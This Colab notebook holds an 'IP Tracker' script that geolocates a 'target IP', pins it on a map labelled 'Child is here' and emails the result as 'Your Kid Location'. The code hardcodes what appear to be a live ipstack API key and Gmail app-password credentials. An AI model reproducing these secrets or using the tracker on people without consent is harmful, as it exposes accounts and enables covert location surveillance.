{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": 15,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "1VredUOi48Na",
        "outputId": "f6c7c1a5-23e6-487e-82a2-975ae80eafbd"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "\u001b[1;33m\n",
            "\t\t$$$$$$\\ $$$$$$$\\        $$$$$$$$\\ $$$$$$$\\   $$$$$$\\   $$$$$$\\  $$\\   $$\\ $$$$$$$$\\ $$$$$$$\\  \n",
            "\t\t\\_$$  _|$$  __$$\\       \\__$$  __|$$  __$$\\ $$  __$$\\ $$  __$$\\ $$ | $$  |$$  _____|$$  __$$\\ \n",
            "  \t\t  $$ |  $$ |  $$ |         $$ |   $$ |  $$ |$$ /  $$ |$$ /  \\__|$$ |$$  / $$ |      $$ |  $$ |\n",
            "  \t\t  $$ |  $$$$$$$  |         $$ |   $$$$$$$  |$$$$$$$$ |$$ |      $$$$$  /  $$$$$\\    $$$$$$$  |\n",
            "  \t\t  $$ |  $$  ____/\u001b[1;32m          $$ |   $$  __$$< $$  __$$ |$$ |      $$  $$<   $$  __|   $$  __$$< \n",
            "  \t\t  $$ |  $$ |               $$ |   $$ |  $$ |$$ |  $$ |$$ |  $$\\ $$ |\\$$\\  $$ |      $$ |  $$ |\u001b[1;31m{v3.0}\u001b[1;31m\n",
            "\t\t$$$$$$\\ $$ |               $$ |   $$ |  $$ |$$ |  $$ |\\$$$$$$  |$$ | \\$$\\ $$$$$$$$\\ $$ |  $$ |\n",
            "\t\t\\______|\\__|               \\__|   \\__|  \\__|\\__|  \\__| \\______/ \\__|  \\__|\\________|\\__|  \\__|\u001b[1;32m\n",
            "\u001b[1;33m\n",
            "\n",
            "\u001b[1;33m==================================================================================================\u001b[1;33m\n",
            "\n",
            "\u001b[1;33mYour IP: \u001b[1;33m35.231.12.255\n",
            "\u001b[1;32mIf You Do Not Want To Track Type Exit\u001b[1;32m\n",
            "\n",
            "\u001b[1;36mEnter Your Target IP: \u001b[1;36m103.4.221.252\n",
            "\n",
            "\u001b[1;33mAll The Information Of IP Is Here \u001b[1;33m[103.4.221.252] :\n",
            "\n",
            "\u001b[1;33mIP: \u001b[1;33m103.4.221.252\n",
            "\u001b[1;32mIP Type: \u001b[1;32mipv4\n",
            "\u001b[1;34mContinent Name: \u001b[1;34mAsia\n",
            "\u001b[1;34mContinent Code: \u001b[1;34mAS\n",
            "\u001b[1;33mCountry: \u001b[1;33mIndia\n",
            "\u001b[1;33mCountry Code: \u001b[1;33mIN\n",
            "\u001b[1;32mRegion Name: \u001b[1;32mRajasthan\n",
            "\u001b[1;32mRegion Code: \u001b[1;32mRJ\n",
            "\u001b[1;36mCity: \u001b[1;36mNagar\n",
            "\u001b[1;36mZip: \u001b[1;36m321205\n",
            "\u001b[1;33mTimeZone: \u001b[1;33mAsia/Kolkata\n",
            "\u001b[1;33misp: \u001b[1;33mSRM University\n",
            "\u001b[1;36mLatitude: \u001b[1;36m27.4224\n",
            "\u001b[1;36mlongitude: \u001b[1;36m77.0992\n",
            "\u001b[1;33mMore Information Of IP \u001b[1;33m:\n",
            "{\"geoname_id\": 1262253, \"capital\": \"New Delhi\", \"languages\": [{\"code\": \"hi\", \"name\": \"Hindi\", \"native\": \"\\u0939\\u093f\\u0928\\u094d\\u0926\\u0940\"}, {\"code\": \"en\", \"name\": \"English\", \"native\": \"English\"}], \"country_flag\": \"https://assets.ipstack.com/flags/in.svg\", \"country_flag_emoji\": \"\\ud83c\\uddee\\ud83c\\uddf3\", \"country_flag_emoji_unicode\": \"U+1F1EE U+1F1F3\", \"calling_code\": \"91\", \"is_eu\": false}\n",
            "\n",
            "\n",
            "\n"
          ]
        }
      ],
      "source": [
        "import os\n",
        "import urllib.request as urllib2\n",
        "import geocoder\n",
        "import json\n",
        "import folium\n",
        "\n",
        "url = \"http://ip-api.com/json/\"\n",
        "load1 = urllib2.urlopen(url)\n",
        "read1 = load1.read()\n",
        "result1 = json.loads(read1)\n",
        "os.system('clear')\n",
        "print('''\n",
        "\\033[1;33m\n",
        "\t\t$$$$$$\\ $$$$$$$\\        $$$$$$$$\\ $$$$$$$\\   $$$$$$\\   $$$$$$\\  $$\\   $$\\ $$$$$$$$\\ $$$$$$$\\\n",
        "\t\t\\_$$  _|$$  __$$\\       \\__$$  __|$$  __$$\\ $$  __$$\\ $$  __$$\\ $$ | $$  |$$  _____|$$  __$$\\\n",
        "  \t\t  $$ |  $$ |  $$ |         $$ |   $$ |  $$ |$$ /  $$ |$$ /  \\__|$$ |$$  / $$ |      $$ |  $$ |\n",
        "  \t\t  $$ |  $$$$$$$  |         $$ |   $$$$$$$  |$$$$$$$$ |$$ |      $$$$$  /  $$$$$\\    $$$$$$$  |\n",
        "  \t\t  $$ |  $$  ____/\\033[1;32m          $$ |   $$  __$$< $$  __$$ |$$ |      $$  $$<   $$  __|   $$  __$$<\n",
        "  \t\t  $$ |  $$ |               $$ |   $$ |  $$ |$$ |  $$ |$$ |  $$\\ $$ |\\$$\\  $$ |      $$ |  $$ |\\033[1;31m{v3.0}\\033[1;31m\n",
        "\t\t$$$$$$\\ $$ |               $$ |   $$ |  $$ |$$ |  $$ |\\$$$$$$  |$$ | \\$$\\ $$$$$$$$\\ $$ |  $$ |\n",
        "\t\t\\______|\\__|               \\__|   \\__|  \\__|\\__|  \\__| \\______/ \\__|  \\__|\\________|\\__|  \\__|\\033[1;32m\n",
        "\\033[1;33m\n",
        "''')\n",
        "print(\"\\033[1;33m==================================================================================================\\033[1;33m\")\n",
        "print (\"\\n\\033[1;33mYour IP: \\033[1;33m\" + result1['query'])\n",
        "print (\"\\033[1;32mIf You Do Not Want To Track Type Exit\\033[1;32m\\n\")\n",
        "\n",
        "while True:\n",
        "    ip = input(\"\\033[1;36mEnter Your Target IP: \\033[1;36m\")\n",
        "\n",
        "    if ip == 'exit':\n",
        "        break\n",
        "    else:\n",
        "        #ips Coding\n",
        "        api = \"http://api.ipstack.com/\"\n",
        "        load = urllib2.urlopen(api + ip + '?access_key=fd0c1eae3c2d27ee676af0db2b864b0e')\n",
        "        read = load.read()\n",
        "        result = json.loads(read)\n",
        "\n",
        "        #ip-api\n",
        "        url = \"http://ip-api.com/json/\"\n",
        "        load1 = urllib2.urlopen(url + ip)\n",
        "        read1 = load1.read()\n",
        "        result1 = json.loads(read1)\n",
        "\n",
        "        if result1['status'] == 'success':\n",
        "            lati = result['latitude']\n",
        "            lat = \"{:.4f}\".format(lati)\n",
        "            lon = result['longitude']\n",
        "            long = \"{:.4f}\".format(lon)\n",
        "            more = json.dumps(result['location'])\n",
        "            print (\"\\n\\033[1;33mAll The Information Of IP Is Here \\033[1;33m[\" + ip + \"] :\\n\")\n",
        "            print (\"\\033[1;33mIP: \\033[1;33m\" + result['ip'])\n",
        "            print (\"\\033[1;32mIP Type: \\033[1;32m\" + result['type'])\n",
        "            print (\"\\033[1;34mContinent Name: \\033[1;34m\" + result['continent_name'])\n",
        "            print (\"\\033[1;34mContinent Code: \\033[1;34m\" + result['continent_code'])\n",
        "            print (\"\\033[1;33mCountry: \\033[1;33m\" + result['country_name'])\n",
        "            print (\"\\033[1;33mCountry Code: \\033[1;33m\" + result1['countryCode'])\n",
        "            print (\"\\033[1;32mRegion Name: \\033[1;32m\" + result['region_name'])\n",
        "            print (\"\\033[1;32mRegion Code: \\033[1;32m\" + result['region_code'])\n",
        "            print (\"\\033[1;36mCity: \\033[1;36m\" + result['city'])\n",
        "            print (\"\\033[1;36mZip: \\033[1;36m\" + result['zip'])\n",
        "            print (\"\\033[1;33mTimeZone: \\033[1;33m\" + result1['timezone'])\n",
        "            print (\"\\033[1;33misp: \\033[1;33m\" + result1['isp'])\n",
        "            print (\"\\033[1;36mLatitude: \\033[1;36m\" + lat)\n",
        "            print (\"\\033[1;36mlongitude: \\033[1;36m\" + long)\n",
        "            print (\"\\033[1;33mMore Information Of IP \\033[1;33m:\\n\" + more)\n",
        "            print (\"\\n\\n\")\n",
        "            location = geocoder.ip(ip).latlng\n",
        "            lat1=location[0]\n",
        "            long2=location[1]\n",
        "            map = folium.Map(location=[lat1, long2], zoom_start=15)\n",
        "            map.add_child(folium.Marker(location=[lat1, long2], popup='Child is here',icon=folium.Icon(color='green')))\n",
        "            map\n",
        "            break"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from redmail import gmail\n",
        "gmail.username = 'dwepay.india@gmail.com'  # Your Gmail address\n",
        "email_body = f\"\"\"\n",
        "All The Information Of IP Is Here [{ip}] :\n",
        "\n",
        "IP: {result['ip']}\n",
        "IP Type: {result['type']}\n",
        "Continent Name: {result['continent_name']}\n",
        "Continent Code: {result['continent_code']}\n",
        "Country: {result['country_name']}\n",
        "Country Code: {result1['countryCode']}\n",
        "Region Name: {result['region_name']}\n",
        "Region Code: {result['region_code']}\n",
        "City: {result['city']}\n",
        "Zip: {result['zip']}\n",
        "TimeZone: {result1['timezone']}\n",
        "isp: {result1['isp']}\n",
        "Latitude: {lat}\n",
        "Longitude: {long}\n",
        "More Information Of IP:\n",
        "{more}\n",
        "\"\"\"\n",
        "gmail.password = 'pllbckjjqnnifktz'\n",
        "gmail.send(\n",
        "        subject=\"Your Kid Location : \",\n",
        "        receivers=[\"krishneerajkumar@gmail.com\"],\n",
        "        text=email_body)\n",
        "\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "SpHgU6FI6NxQ",
        "outputId": "275e3c85-44eb-449f-93ad-081adf22f827"
      },
      "execution_count": 16,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<email.message.EmailMessage at 0x7f70fe758be0>"
            ]
          },
          "metadata": {},
          "execution_count": 16
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "pip install redmail"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "9-blxJ1j9Qgf",
        "outputId": "6d7ec5cb-9e2f-4870-990b-0ba5a6aa34c0"
      },
      "execution_count": 14,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting redmail\n",
            "  Downloading redmail-0.6.0-py3-none-any.whl (46 kB)\n",
            "\u001b[?25l     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m0.0/46.9 kB\u001b[0m \u001b[31m?\u001b[0m eta \u001b[36m-:--:--\u001b[0m\r\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m46.9/46.9 kB\u001b[0m \u001b[31m1.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hRequirement already satisfied: jinja2 in /usr/local/lib/python3.10/dist-packages (from redmail) (3.1.3)\n",
            "Requirement already satisfied: MarkupSafe>=2.0 in /usr/local/lib/python3.10/dist-packages (from jinja2->redmail) (2.1.5)\n",
            "Installing collected packages: redmail\n",
            "Successfully installed redmail-0.6.0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import geocoder\n",
        "\n",
        "def get_current_location():\n",
        "    # Using the 'ipinfo' provider to get location based on IP address\n",
        "    location = geocoder.ip('me')\n",
        "    return location.latlng\n",
        "\n",
        "coordinates = get_current_location()\n",
        "if coordinates:\n",
        "    print(\"Latitude:\", coordinates[0])\n",
        "    print(\"Longitude:\", coordinates[1])\n",
        "else:\n",
        "    print(\"Location not found.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "oLO1INzo6f_C",
        "outputId": "502753dc-4355-47c5-8cf7-69eabb49e95c"
      },
      "execution_count": 6,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Latitude: 32.8546\n",
            "Longitude: -79.9748\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "map"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 532
        },
        "id": "MR5ZeSbd5XLj",
        "outputId": "22d95199-2b8f-428b-d782-222d4e181290"
      },
      "execution_count": 13,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<folium.folium.Map at 0x7f7102aa79d0>"
            ],
            "text/html": [
              "<div style=\"width:100%;\"><div style=\"position:relative;width:100%;height:0;padding-bottom:60%;\"><span style=\"color:#565656\">Make this Notebook Trusted to load map: File -> Trust Notebook</span><iframe srcdoc=\"&lt;!DOCTYPE html&gt;\n",
              "&lt;html&gt;\n",
              "&lt;head&gt;\n",
              "    \n",
              "    &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;\n",
              "    \n",
              "        &lt;script&gt;\n",
              "            L_NO_TOUCH = false;\n",
              "            L_DISABLE_3D = false;\n",
              "        &lt;/script&gt;\n",
              "    \n",
              "    &lt;style&gt;html, body {width: 100%;height: 100%;margin: 0;padding: 0;}&lt;/style&gt;\n",
              "    &lt;style&gt;#map {position:absolute;top:0;bottom:0;right:0;left:0;}&lt;/style&gt;\n",
              "    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/leaflet@1.9.3/dist/leaflet.js&quot;&gt;&lt;/script&gt;\n",
              "    &lt;script src=&quot;https://code.jquery.com/jquery-1.12.4.min.js&quot;&gt;&lt;/script&gt;\n",
              "    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;\n",
              "    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/Leaflet.awesome-markers/2.0.2/leaflet.awesome-markers.js&quot;&gt;&lt;/script&gt;\n",
              "    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/leaflet@1.9.3/dist/leaflet.css&quot;/&gt;\n",
              "    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css&quot;/&gt;\n",
              "    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css&quot;/&gt;\n",
              "    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.0/css/all.min.css&quot;/&gt;\n",
              "    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/Leaflet.awesome-markers/2.0.2/leaflet.awesome-markers.css&quot;/&gt;\n",
              "    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/gh/python-visualization/folium/folium/templates/leaflet.awesome.rotate.min.css&quot;/&gt;\n",
              "    \n",
              "            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,\n",
              "                initial-scale=1.0, maximum-scale=1.0, user-scalable=no&quot; /&gt;\n",
              "            &lt;style&gt;\n",
              "                #map_b036834844b4f553021729c4763d9d1d {\n",
              "                    position: relative;\n",
              "                    width: 100.0%;\n",
              "                    height: 100.0%;\n",
              "                    left: 0.0%;\n",
              "                    top: 0.0%;\n",
              "                }\n",
              "                .leaflet-container { font-size: 1rem; }\n",
              "            &lt;/style&gt;\n",
              "        \n",
              "&lt;/head&gt;\n",
              "&lt;body&gt;\n",
              "    \n",
              "    \n",
              "            &lt;div class=&quot;folium-map&quot; id=&quot;map_b036834844b4f553021729c4763d9d1d&quot; &gt;&lt;/div&gt;\n",
              "        \n",
              "&lt;/body&gt;\n",
              "&lt;script&gt;\n",
              "    \n",
              "    \n",
              "            var map_b036834844b4f553021729c4763d9d1d = L.map(\n",
              "                &quot;map_b036834844b4f553021729c4763d9d1d&quot;,\n",
              "                {\n",
              "                    center: [12.8452, 80.0606],\n",
              "                    crs: L.CRS.EPSG3857,\n",
              "                    zoom: 15,\n",
              "                    zoomControl: true,\n",
              "                    preferCanvas: false,\n",
              "                }\n",
              "            );\n",
              "\n",
              "            \n",
              "\n",
              "        \n",
              "    \n",
              "            var tile_layer_6799344c52a85c64a7a1f8bf201f63ed = L.tileLayer(\n",
              "                &quot;https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png&quot;,\n",
              "                {&quot;attribution&quot;: &quot;Data by \\u0026copy; \\u003ca target=\\&quot;_blank\\&quot; href=\\&quot;http://openstreetmap.org\\&quot;\\u003eOpenStreetMap\\u003c/a\\u003e, under \\u003ca target=\\&quot;_blank\\&quot; href=\\&quot;http://www.openstreetmap.org/copyright\\&quot;\\u003eODbL\\u003c/a\\u003e.&quot;, &quot;detectRetina&quot;: false, &quot;maxNativeZoom&quot;: 18, &quot;maxZoom&quot;: 18, &quot;minZoom&quot;: 0, &quot;noWrap&quot;: false, &quot;opacity&quot;: 1, &quot;subdomains&quot;: &quot;abc&quot;, &quot;tms&quot;: false}\n",
              "            ).addTo(map_b036834844b4f553021729c4763d9d1d);\n",
              "        \n",
              "    \n",
              "            var marker_d56ab0102b7820252ca067d9ddece58c = L.marker(\n",
              "                [12.8452, 80.0606],\n",
              "                {}\n",
              "            ).addTo(map_b036834844b4f553021729c4763d9d1d);\n",
              "        \n",
              "    \n",
              "            var icon_dad96fec01612d2dfb1237df42a4ab4f = L.AwesomeMarkers.icon(\n",
              "                {&quot;extraClasses&quot;: &quot;fa-rotate-0&quot;, &quot;icon&quot;: &quot;info-sign&quot;, &quot;iconColor&quot;: &quot;white&quot;, &quot;markerColor&quot;: &quot;green&quot;, &quot;prefix&quot;: &quot;glyphicon&quot;}\n",
              "            );\n",
              "            marker_d56ab0102b7820252ca067d9ddece58c.setIcon(icon_dad96fec01612d2dfb1237df42a4ab4f);\n",
              "        \n",
              "    \n",
              "        var popup_279cd8e4e6b517c6b0d3b0f4543a9ac3 = L.popup({&quot;maxWidth&quot;: &quot;100%&quot;});\n",
              "\n",
              "        \n",
              "            \n",
              "                var html_6fc675f6fe3099df56a30fac0e10b901 = $(`&lt;div id=&quot;html_6fc675f6fe3099df56a30fac0e10b901&quot; style=&quot;width: 100.0%; height: 100.0%;&quot;&gt;Child is here&lt;/div&gt;`)[0];\n",
              "                popup_279cd8e4e6b517c6b0d3b0f4543a9ac3.setContent(html_6fc675f6fe3099df56a30fac0e10b901);\n",
              "            \n",
              "        \n",
              "\n",
              "        marker_d56ab0102b7820252ca067d9ddece58c.bindPopup(popup_279cd8e4e6b517c6b0d3b0f4543a9ac3)\n",
              "        ;\n",
              "\n",
              "        \n",
              "    \n",
              "&lt;/script&gt;\n",
              "&lt;/html&gt;\" style=\"position:absolute;width:100%;height:100%;left:0;top:0;border:none !important;\" allowfullscreen webkitallowfullscreen mozallowfullscreen></iframe></div></div>"
            ]
          },
          "metadata": {},
          "execution_count": 13
        }
      ]
    }
  ]
}